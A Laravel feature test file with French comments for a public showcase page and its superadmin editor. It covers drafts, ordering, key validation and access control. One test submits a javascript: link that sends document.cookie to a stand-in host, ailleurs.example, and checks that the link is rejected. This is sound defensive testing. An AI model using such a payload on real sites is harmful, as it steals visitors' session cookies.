<?php

namespace Tests\Feature;

use App\Modules\Admin\Modeles\VitrineCarte;
use App\Modules\Admin\Modeles\VitrineSection;
use App\Modules\Authentification\Modeles\Utilisateur;
use App\Modules\Authentification\Regles\Habilitations;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * La vitrine : le contenant, tenu par la plateforme.
 *
 * Le contenu d'une page de présentation change plus souvent que le code qui
 * l'affiche. L'écrire en dur aurait voulu dire un déploiement à chaque
 * virgule, et une relecture de code pour une faute de frappe. Il vit donc en
 * base, saisi depuis l'écran superadmin.
 *
 * **Rien n'est pré-rempli** : le texte d'une vitrine engage l'entreprise
 * qu'elle présente. Une vitrine vide affiche une page d'attente honnête, pas
 * du faux texte qui finirait en production le jour où quelqu'un oublierait de
 * le remplacer.
 */
class VitrineTest extends TestCase
{
    use RefreshDatabase;

    private Utilisateur $superadmin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->superadmin = Utilisateur::create([
            'nom' => 'Plateforme', 'prenom' => 'Super', 'email' => 'super-vitrine@selflow.ci',
            'password' => bcrypt('secret-de-test'), 'role' => 'superadmin', 'entreprise_id' => null,
            'habilitations' => Habilitations::PLATEFORME,
        ]);
    }

    private function uneSection(array $champs = []): VitrineSection
    {
        return VitrineSection::create(array_merge([
            'cle' => 'atouts', 'titre' => 'Titre de test',
            'gabarit' => 'colonnes', 'ordre' => 10, 'publiee' => true,
        ], $champs));
    }

    // ══════════════ La page publique ══════════════

    public function test_une_vitrine_vide_annonce_une_page_en_preparation(): void
    {
        // Plutôt que d'inventer un contenu de présentation, qui finirait en
        // production le jour où personne ne penserait à le remplacer.
        $this->get(route('vitrine'))
            ->assertOk()
            ->assertSee('Cette page est en préparation', false);
    }

    public function test_la_page_publique_montre_les_sections_publiees(): void
    {
        $section = $this->uneSection(['titre' => 'Ce que fait Selflow']);
        VitrineCarte::create([
            'section_id' => $section->id, 'titre' => 'Une carte visible',
            'texte' => 'Son texte.', 'ordre' => 10, 'publiee' => true,
        ]);

        $this->get(route('vitrine'))
            ->assertOk()
            ->assertSee('Ce que fait Selflow', false)
            ->assertSee('Une carte visible', false);
    }

    public function test_une_section_en_brouillon_reste_invisible(): void
    {
        // C'est ce qui permet de préparer une page tranquillement.
        $this->uneSection(['titre' => 'Section pas prête', 'publiee' => false]);

        $this->get(route('vitrine'))
            ->assertOk()
            ->assertDontSee('Section pas prête', false);
    }

    public function test_une_carte_masquee_reste_invisible(): void
    {
        $section = $this->uneSection();
        VitrineCarte::create([
            'section_id' => $section->id, 'titre' => 'Carte masquée',
            'ordre' => 10, 'publiee' => false,
        ]);

        $this->get(route('vitrine'))
            ->assertOk()
            ->assertDontSee('Carte masquée', false);
    }

    public function test_la_vitrine_s_ouvre_sans_etre_connecte(): void
    {
        // Une page de présentation qui exige un compte ne présente rien.
        $this->get(route('vitrine'))->assertOk();
    }

    public function test_la_vitrine_reste_lisible_par_un_utilisateur_connecte(): void
    {
        // Derrière `guest`, elle aurait renvoyé un connecté vers son tableau
        // de bord au lieu de la lui montrer.
        $this->actingAs($this->superadmin)->get(route('vitrine'))->assertOk();
    }

    public function test_les_sections_sortent_dans_l_ordre_choisi(): void
    {
        $this->uneSection(['cle' => 'seconde', 'titre' => 'Vient en second', 'ordre' => 20]);
        $this->uneSection(['cle' => 'premiere', 'titre' => 'Vient en premier', 'ordre' => 10]);

        $page = $this->get(route('vitrine'))->getContent();

        $this->assertLessThan(
            strpos($page, 'Vient en second'),
            strpos($page, 'Vient en premier')
        );
    }

    // ══════════════ L'écran du superadmin ══════════════

    public function test_le_superadmin_atteint_l_ecran_de_la_vitrine(): void
    {
        $this->actingAs($this->superadmin)
            ->get(route('superadmin.vitrine.index'))
            ->assertOk();
    }

    public function test_une_section_naît_hors_ligne(): void
    {
        // Publier doit être un geste délibéré : une section créée par erreur ne
        // doit pas se retrouver sur la page publique dans la seconde.
        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.creer'), [
                'cle' => 'tarifs', 'titre' => 'Nos offres', 'gabarit' => 'tarifs',
            ])
            ->assertRedirect();

        $this->assertFalse(VitrineSection::where('cle', 'tarifs')->first()->publiee);
    }

    public function test_la_cle_n_accepte_pas_n_importe_quoi(): void
    {
        // Elle sert d'ancre dans l'adresse : un espace ou un accent y casserait
        // le lien.
        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.creer'), [
                'cle' => 'Nos Tarifs !', 'titre' => 'Nos offres', 'gabarit' => 'tarifs',
            ])
            ->assertSessionHasErrors('cle');
    }

    public function test_deux_sections_ne_partagent_pas_une_cle(): void
    {
        $this->uneSection(['cle' => 'tarifs']);

        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.creer'), [
                'cle' => 'tarifs', 'titre' => 'Doublon', 'gabarit' => 'colonnes',
            ])
            ->assertSessionHasErrors('cle');
    }

    public function test_un_gabarit_inconnu_est_refuse(): void
    {
        // La page sait dessiner cinq dispositions : une sixième la laisserait
        // sans instruction devant la section.
        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.creer'), [
                'cle' => 'ailleurs', 'titre' => 'Test', 'gabarit' => 'carrousel-3d',
            ])
            ->assertSessionHasErrors('gabarit');
    }

    public function test_publier_puis_retirer_une_section(): void
    {
        $section = $this->uneSection(['publiee' => false]);

        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.basculer', $section));
        $this->assertTrue($section->fresh()->publiee);

        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.sections.basculer', $section));
        $this->assertFalse($section->fresh()->publiee);
    }

    public function test_supprimer_une_section_emporte_ses_cartes(): void
    {
        // Une carte orpheline ne s'afficherait nulle part et resterait en base.
        $section = $this->uneSection();
        VitrineCarte::create(['section_id' => $section->id, 'titre' => 'Sa carte', 'ordre' => 10]);

        $this->actingAs($this->superadmin)
            ->delete(route('superadmin.vitrine.sections.supprimer', $section));

        $this->assertSame(0, VitrineSection::count());
        $this->assertSame(0, VitrineCarte::count());
    }

    // ══════════════ Ce qu'on refuse d'afficher ══════════════

    public function test_un_lien_javascript_est_refuse(): void
    {
        // Déposé ici, il s'exécuterait chez chaque visiteur de la page
        // publique — qui n'a aucune raison de se méfier d'une page de
        // présentation.
        $section = $this->uneSection();

        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.cartes.creer', $section), [
                'titre'    => 'Carte piégée',
                'lien_url' => 'javascript:fetch("https://ailleurs.example/?c="+document.cookie)',
            ])
            ->assertSessionHasErrors('lien_url');

        $this->assertSame(0, VitrineCarte::count());
    }

    public function test_un_lien_interne_reste_accepte(): void
    {
        $section = $this->uneSection();

        $this->actingAs($this->superadmin)
            ->post(route('superadmin.vitrine.cartes.creer', $section), [
                'titre' => 'Créer un compte', 'lien_url' => '/inscription',
            ])
            ->assertSessionDoesntHaveErrors();

        $this->assertSame('/inscription', VitrineCarte::first()->lien_url);
    }

    // ══════════════ Qui peut écrire ══════════════

    public function test_un_visiteur_ne_touche_pas_a_la_vitrine(): void
    {
        $this->post(route('superadmin.vitrine.sections.creer'), [
            'cle' => 'pirate', 'titre' => 'Injecté', 'gabarit' => 'colonnes',
        ])->assertRedirect();

        $this->assertSame(0, VitrineSection::count());
    }

    public function test_un_admin_d_entreprise_ne_touche_pas_a_la_vitrine(): void
    {
        // La vitrine est la page de la plateforme : le client d'une entreprise
        // n'a rien à y écrire.
        $entreprise = \App\Modules\Admin\Modeles\Entreprise::create(['nom' => 'Boutique du coin']);
        $admin = Utilisateur::create([
            'nom' => 'Kouassi', 'prenom' => 'Yao', 'email' => 'yao-vitrine@exemple.ci',
            'password' => bcrypt('secret-de-test'), 'role' => 'admin',
            'entreprise_id' => $entreprise->id,
        ]);

        $this->actingAs($admin)
            ->post(route('superadmin.vitrine.sections.creer'), [
                'cle' => 'pirate', 'titre' => 'Injecté', 'gabarit' => 'colonnes',
            ])
            ->assertForbidden();

        $this->assertSame(0, VitrineSection::count());
    }

    public function test_un_superadmin_sans_l_habilitation_est_refuse(): void
    {
        // Le contrôle ferme par défaut : l'habilitation doit être portée.
        $restreint = Utilisateur::create([
            'nom' => 'Plateforme', 'prenom' => 'Restreint', 'email' => 'restreint-vitrine@selflow.ci',
            'password' => bcrypt('secret-de-test'), 'role' => 'superadmin', 'entreprise_id' => null,
            'habilitations' => ['tableau_de_bord_superadmin'],
        ]);

        $this->actingAs($restreint)
            ->get(route('superadmin.vitrine.index'))
            ->assertForbidden();
    }
}
